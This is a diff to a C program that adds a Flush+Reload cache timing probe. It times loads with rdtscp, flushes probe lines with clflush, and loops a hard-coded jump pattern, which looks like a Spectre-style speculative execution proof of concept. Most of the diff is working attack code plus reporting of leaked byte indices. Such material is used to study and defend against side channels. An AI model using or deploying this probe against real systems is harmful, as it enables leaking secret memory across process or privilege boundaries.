@@ -3,6 +3,10 @@
 #include <stdint.h>
 #include <string.h>
 #include <stdlib.h>
+#include <signal.h>
+#include <x86intrin.h>
+#include <unistd.h>
+
 
 
 void __attribute__((section(".fnptr"))) (*fn_ptr)(void);
@@ -10,6 +14,55 @@ void __attribute__((section(".fnptr"))) (*fn_ptr)(void);
 
 #define PAGE_SIZE 0x1000
 #define MAX_PAGES 100
+#define NUM_PROBES 256
+
+#define MAX_PROBE_SPACE (100003)
+double avgpct = 0;
+
+uint64_t __attribute__((section(".cur_probe_space"))) cur_probe_space = 4177;
+uint8_t __attribute__((section(".probe_buf"))) *probe_buf;
+
+uint64_t results[NUM_PROBES];
+
+uint64_t cache_hits = 0;    // Number cache hits (<140 cycles read)
+uint64_t tot_runs = 0;      // Number of trials (i.e. 10k)
+uint64_t tot_time = 0;      // Number cycles total
+
+unsigned int junk=0;    // For rdtscp
+
+
+void check_probes() {
+    uint64_t t0, t1;
+    uint8_t *addr;
+
+    int i, mix_i;
+    for (i=0; i<NUM_PROBES; i++) {
+        //mix_i = ((i*13) + 7) & 15;
+        mix_i = i;
+        addr = &probe_buf[mix_i*cur_probe_space];
+        t0 = _rdtscp(&junk);
+        asm volatile( "movb (%%rbx), %%al\n"
+            :: "b"(addr) : "rax");
+        t1 = _rdtscp(&junk);
+        if (t1-t0 < 140) {
+            cache_hits++;
+            tot_time += t1-t0;
+            results[mix_i]++;
+            //printf("# %lu\n", t1-t0);
+            //_mm_clflush(addr);
+        }
+    }
+    tot_runs++;
+
+    // Clear probe_buf from cache
+    for (i=0; i<NUM_PROBES; i++) {
+        _mm_clflush(&probe_buf[i*cur_probe_space]);
+    }
+    //usleep(100);
+}
+
+
+
 
 uint64_t loaded_pages[MAX_PAGES];
 int loaded_pages_idx = 0;
@@ -164,14 +217,50 @@ int main()
     n1.jmp = (void*)0x7ffff77e396d;    // TODO: make this less ugly?
 
 
-
-
-
     the_ptr = nop;
     void *ptr = &the_ptr;
 
+    probe_buf = malloc(MAX_PROBE_SPACE*NUM_PROBES);
+    if (probe_buf == NULL) {
+        perror("malloc");
+        return -1;
+    }
 
+    int i;
     setup();
-    do_pattern(&n1);
+    while (1) {
+        //_mm_clflush(n2->jmp);
+        for (i=0; i<15000; i++) {
+            _mm_clflush(&n2);
+            do_pattern(&n1);
+            usleep(1);
+        }
+
+        // Check stats...
+        uint64_t avg = 0;
+        if (cache_hits > 0) avg = tot_time/cache_hits;
+
+        uint64_t max_res=0, max_i=0;
+        for (i=0; i<NUM_PROBES; i++) {
+            if (results[i]>max_res) {
+                max_res = results[i];
+                max_i = i;
+            }
+        }
+
+        if ((max_res > 10 && avg < 50) || (max_res > 2 && avg < 30)){
+            printf("[%02lx]: %04lu / %lu = %0.5f%% hits, %lu avg cycles, ps %ld\n",
+            max_i, max_res, tot_runs, 100*((float)max_res)/tot_runs, avg, cur_probe_space);
+
+        } else {
+            printf("--[%lu]: %lu, %lu avg cycles ps %ld, 13 had: %lu, %lu tot hits\n", max_i, max_res, avg, cur_probe_space, results[13], cache_hits);
+        }
+
+        cache_hits = 0;
+        tot_runs = 0;
+        tot_time = 0;
+        memset(results, 0, sizeof(uint64_t)*NUM_PROBES);
+        usleep(1000);
+    }
 }
 
